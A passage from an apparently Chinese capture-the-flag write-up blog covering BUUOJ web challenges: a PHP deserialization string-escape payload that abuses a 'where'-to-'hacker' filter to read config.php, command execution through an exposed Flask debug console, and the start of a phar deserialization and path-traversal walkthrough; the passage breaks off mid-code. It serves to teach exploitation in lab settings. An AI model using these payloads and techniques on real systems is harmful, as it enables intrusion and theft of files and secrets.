class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>可以想到是通过file_get_contents获取config.php的内容,那么我们势必要在某个地方构造序列化来执行我们想要的,再来看看update.php:</p><ul><li>update.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Login First'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">$file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">"static/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">"static/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">"static/bootstrap.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class="container" style="margin-top:100px"&gt;  </span><br><span class="line">&lt;form action="update.php" method="post" enctype="multipart/form-data" class="well" style="width:220px;margin:0px auto;"&gt; </span><br><span class="line">&lt;img src="static/piapiapia.gif" class="img-memeda " style="width:180px;margin:0px auto;"&gt;</span><br><span class="line">&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class="line">&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class="line">&lt;input type="text" name="phone" style="height:30px"class="span3"/&gt;</span><br><span class="line">&lt;label&gt;Email:&lt;/label&gt;</span><br><span class="line">&lt;input type="text" name="email" style="height:30px"class="span3"/&gt;</span><br><span class="line">&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class="line">&lt;input type="text" name="nickname" style="height:30px" class="span3"&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;Photo:&lt;/label&gt;</span><br><span class="line">&lt;input type="file" name="photo" style="height:30px"class="span3"/&gt;</span><br><span class="line">&lt;button type="submit" class="btn btn-primary"&gt;UPDATE&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>在这里首先是对传进来的4个内容进行判断,但是我们发现nickname如果是数组就可以绕过:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_POST[<span class="string">'nickname'</span>]=<span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'pass it'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//pass it</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这样我们就可以控制序列化内容了,但是序列化后的内容总是被<code>&quot;&quot;</code>包围起来,还是不能逃逸来构造我们想要的.接下来是update_profile方法对序列化后的$profile进行操作,那么我们看看class.php里面user类的update_profile方法有没有可利用的地方.</p><ul><li>class.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $table = <span class="string">'users'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">$key_list = <span class="keyword">Array</span>(<span class="string">'username'</span>, <span class="string">'password'</span>);</span><br><span class="line">$value_list = <span class="keyword">Array</span>($username, md5($password));</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line"><span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line"><span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> $link = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">$config[<span class="string">'hostname'</span>],</span><br><span class="line">$config[<span class="string">'username'</span>], </span><br><span class="line">$config[<span class="string">'password'</span>]</span><br><span class="line">);</span><br><span class="line">mysql_select_db($config[<span class="string">'database'</span>]);</span><br><span class="line">mysql_query(<span class="string">"SET sql_mode='strict_all_tables'"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($table, $where, $ret = <span class="string">'*'</span>)</span> </span>&#123;</span><br><span class="line">$sql = <span class="string">"SELECT $ret FROM $table WHERE $where"</span>;</span><br><span class="line">$result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line"><span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class="line">$key = implode(<span class="string">','</span>, $key_list);</span><br><span class="line">$value = <span class="string">'\''</span> . implode(<span class="string">'\',\''</span>, $value_list) . <span class="string">'\''</span>; </span><br><span class="line">$sql = <span class="string">"INSERT INTO $table ($key) VALUES ($value)"</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class="line">$sql = <span class="string">"UPDATE $table SET $key = '$value' WHERE $where"</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure></li></ul><p><code>$new_profile = parent::filter($new_profile);</code>这条语句是对传进来的序列化后的$profile进行过滤,再看看父类的filter方法.可以看到是为了防止sql注入,对输入中的单引号、反斜杠以及一些敏感词进行替换,但是这个对序列化后字符串的替换操作,恰好提供了逃逸的的条件.切入点就是这个<code>where</code>被替换为<code>hacker</code>.举个例子:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="string">'s:6:"where""'</span>);</span><br><span class="line"><span class="comment">//where"</span></span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="string">'s:6:"hacker""'</span>);</span><br><span class="line"><span class="comment">//hacker</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>也就是说,原来<code>where&quot;</code>是6个字符,替换为<code>hacker&quot;</code>以后,6个字符刚好读到hacker并且右边是<code>&quot;</code>成功闭合,那如果我们原来的字符串<code>&quot;</code>号后面还有字符,不就成功执行我们想要的操作了吗,只要控制替换操作后多的字符数等于<code>&quot;</code>加上之后字符的数量就可以了,从where替换到hacker,增加了1,那我们想要逃逸多少个字符,就用多少个where.再看个例子:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//假如我们想得到服务器上的樱井莉亚的图片(雾)</span></span><br><span class="line">$profile[<span class="string">'nickname'</span>]= <span class="string">'cxycxycxy";s:5:"photo";s:16:"yingjingliya.jpg";&#125;'</span>;</span><br><span class="line">$profile[<span class="string">'photo'</span>]= <span class="string">'cxy.jpg'</span>;</span><br><span class="line">var_dump(serialize($profile));</span><br><span class="line"><span class="comment">//a:2:&#123;s:8:"nickname";s:48:"cxycxycxy";s:5:"photo";s:16:"yingjingliya.jpg";&#125;";s:5:"photo";s:7:"cxy.jpg";&#125;</span></span><br><span class="line"><span class="comment">/*服务器操作有点憨批,非要把检测到的`cxy`3个字符替换成16个字符的`abcdefghijklmnop`,我只要用3个cxy就能逃逸`";s:5:"photo";s:16:"yingjingliya.jpg";&#125;`这39个字符*/</span></span><br><span class="line">$profile = <span class="string">'a:2:&#123;s:8:"nickname";s:48:"abcdefghijklmnopabcdefghijklmnopabcdefghijklmnop";s:5:"photo";s:16:"yingjingliya.jpg";&#125;";s:5:"photo";s:7:"cxy.jpg";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($profile));</span><br><span class="line"><span class="comment">/*array(2) &#123;</span></span><br><span class="line"><span class="comment">  ["nickname"]=&gt;</span></span><br><span class="line"><span class="comment">  string(48) "abcdefghijklmnopabcdefghijklmnopabcdefghijklmnop"</span></span><br><span class="line"><span class="comment">  ["photo"]=&gt;</span></span><br><span class="line"><span class="comment">  string(16) "yingjingliya.jpg"</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>知道方法以后就好办了,现在本地测试一下,了解序列化后的结构:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$profile[&apos;phone&apos;] = &apos;11111111111&apos;;</span><br><span class="line">$profile[&apos;email&apos;] = &apos;969987508@qq.com&apos;;</span><br><span class="line">$profile[&apos;nickname&apos;] = array(&apos;cxy&apos;);</span><br><span class="line">$profile[&apos;photo&apos;] = &apos;cxy.jpg&apos;;</span><br><span class="line">echo serialize($profile);</span><br><span class="line">//a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:16:&quot;969987508@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;cxy&quot;;&#125;s:5:&quot;photo&quot;;s:7:&quot;cxy.jpg&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>那么可以知道我们需要逃逸的字符串:<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php</code>,需要31个where,构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php</span><br></pre></td></tr></table></figure></p><p><img src="http://i2.tiimg.com/665720/e89221330848e210.png" alt="Markdown"><br>检查img标签,成功获取config.php内容的base64编码,解码后即可得到flag.</p><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p><a href="http://web37.buuoj.cn" target="_blank" rel="noopener">靶机</a><br>这道题问题还挺多的,参考出题师傅的博客<a href="https://www.ckj123.com/?p=147" target="_blank" rel="noopener">ckj123</a>.<br>上面三种方法就不谈了,恰好前几天看了python安全.<a href="http://chenxiyuan.vip/2019/07/24/python%E5%AE%89%E5%85%A8/#more">传送门</a>.登陆出错后弹出debug页面,是flask框架，版本是2.7,发现居然能写pythonshell,果断尝试,什么保护措施都没有,直接上os,platform,subprocess<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">'grep -R "flag"'</span>).read()</span><br><span class="line"><span class="string">'app/templates/index.html:&lt;h1 class="nav"&gt;flag&#123;btf87924u5bvgfxgu0bsztm1zkkwxfgu&#125;&lt;/h1&gt;\napp/static/css/semantic.css: @import url(https://fonts.googleapis.com/css?</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;import subprocess</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;subprocess.Popen('</span>grep -R <span class="string">"flag"</span><span class="string">', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()</span></span><br><span class="line">'app/templates/index.html:&lt;h1 class="nav"&gt;flag&#123;btf87924u5bvgfxgu0bsztm1zkkwxfgu&#125;&lt;/h1&gt;\napp/static/css/semantic.css: @import url(https://fonts.googleapis.com/css?</span><br><span class="line">&gt;&gt;&gt;<span class="keyword">import</span> platform</span><br><span class="line">&gt;&gt;&gt;platform.popen(<span class="string">'grep -R "flag"'</span>).read()</span><br><span class="line"><span class="string">'app/templates/index.html:&lt;h1 class="nav"&gt;flag&#123;btf87924u5bvgfxgu0bsztm1zkkwxfgu&#125;&lt;/h1&gt;\napp/static/css/semantic.css: @import url(https://fonts.googleapis.com/css?</span></span><br></pre></td></tr></table></figure></p><h2 id="Dropbox"><a href="#Dropbox" class="headerlink" title="Dropbox"></a>Dropbox</h2><p><a href="http://web42.buuoj.cn/" target="_blank" rel="noopener">靶机</a><br>访问后是个文件管理系统,先随便上传个文件,下载时候bp抓包修改文件名即可得到源码<code>filename=../../index.php</code>还有<code>class.php</code>,<code>delete.php</code>,<code>upload.php</code>.可以利用phar反序列化漏洞.<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">传送门</a><br>先看个demo吧:</p><ul><li><code>phar.php</code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">$o -&gt; data = <span class="string">'chenxiyuan'</span>;</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>执行<code>php phar.php</code>,生成<code>phar.phar</code>(要将php.ini中的phar.readonly选项设置为Off).打开文件可以看到meta-data是以序列化的形式存储.php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化.</p><ul><li><code>phartest.php</code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">'phar://phar.phar/test.txt'</span>;</span><br><span class="line">    <span class="comment">//unlink($filename);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//$filename= 'phar://phar.phar';</span></span><br><span class="line">    file_get_contents($filename); </span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>运行<code>php phartest.php</code>,成功输出<code>chenxiyuan</code>.测试发现,<code>$filename= &#39;phar://phar.phar&#39;</code>,虽然会报错但依旧会输出.<br>经过代码审计发现<code>delete.php</code>可以利用.<code>$file-&gt;detele();</code>再看<code>class.php</code>里的file类的delete方法:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">   